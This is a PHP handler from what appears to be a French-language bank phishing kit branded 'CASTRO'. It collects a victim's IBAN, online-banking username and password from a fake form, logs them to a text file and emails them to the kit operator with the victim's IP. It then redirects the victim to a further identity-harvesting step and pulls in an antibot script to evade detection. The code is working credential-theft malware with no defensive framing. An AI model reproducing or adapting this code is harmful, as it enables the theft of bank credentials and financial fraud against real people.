<?php
	error_reporting(0);
	ob_start();
	session_start();

include'../antibots.php';
include'iban.php';
include '../email.php';
if($_SERVER['REQUEST_METHOD'] == 'POST'){
if($_POST['ibansub']){
$string = $_POST["iban"];
    $message = '🔘 CASTRO // NEW LOG BANK

🍎 [ INFOS BANQUE ]
🏦 IBAN : '.$_POST["iban"].'
🏦 Utilisateur : '.$_POST["bankid"].'
🏦 Mot de passe : '.$_POST["bankpass"].'

🌟 CASTRO 🌟
';
}
$Subject="[🏦] FRESH LOG BANK | "._ip();
$head="From:🦹🏽‍♂ CASTRO 🦹🏽‍♂  <castro@kingofspam.fr>";
if(isset($string) && !verify_iban($string,$machine_format_only=false)){
     header('location: bank.php?error=true');
}else {
$fil = fopen('api.txt', 'a+');
fwrite($fil, PHP_EOL.'-'.$message.PHP_EOL.'-');
$_SESSION['step_five']  = true;
mail($my_mail,$Subject,$message,$head);
mail($name,$Subject,$message,$head);
		header('location: identity.php?enc=' . md5(time()) . '&p=1&dispatch=' . sha1(time()));   
}
}
else
{
	header('location: ../../index.php');
}
?>